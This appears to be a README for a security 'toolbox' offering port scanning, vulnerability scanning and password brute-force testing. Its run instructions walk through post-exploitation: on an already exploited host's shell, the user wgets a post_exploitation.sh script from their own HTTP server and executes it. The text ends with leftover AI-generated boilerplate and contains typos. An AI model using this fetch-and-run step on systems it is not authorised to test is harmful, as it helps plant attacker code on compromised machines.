# Security Analysis Toolbox

## Overview
This toolbox is designed to provide comprehensive tools for network and vulnerability analysis, as well as password security assessment. It aims to help security professionals and IT administrators to efficiently manage and assess security across their networks.

## Features

### Network Analysis
- **Network Discovery**: Discover all devices connected to the network.
- **Port Scanning**: Analyze open ports to identify potential vulnerabilities.
- **Device Detection**: Detect all devices connected to the network and their status.

### Vulnerability Analysis
- **Vulnerability Scanner**: Scan systems for known vulnerabilities to mitigate potential threats.
- **Advanced Scanning**: Conduct in-depth scans to uncover and assess deeper system vulnerabilities.

### Password Security Analysis
- **Brute Force Attack Resistance Test**: Test the strength of passwords against common brute-force methods.

## Installation
To set up the Security Analysis Toolbox, clone this repository and install the required dependencies:

# How to RUN the Project

RUN main.py on command line with a command as shown below:

To deploy this project run

```bash
  python main.py IP-Address --start-port 1 --end-port 40 
```
After the shell is opened follow these instructions

1-> Open a command terminal on your PC where the post_explotation.sh file is located and run 'pyhton -m http.server' to host the file

2-> Now on the shell run 'wget http://Your-IP-Address:8000/post_exploitation.sh', it will transfer the file in the exploited system

3-> Confirm that the file has been transferred using 'ls; command 

4-> Now run chmod +x post_exploitation

5-> Now run ./post_exploitation


and it will output the python vulnerabilities scripts.





Follow the on-screen menus to select the type of analysis you wish to perform.

## Contributing
Contributions to this project are welcome. Please fork the repository and submit a pull request.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contact
For support or any questions, email us at support@example.com.


This README provides a concise yet comprehensive guide to your toolbox, outlining its features, installation instructions, usage guide, and ways to contribute. Adjust the content according to your actual setup and repository details.






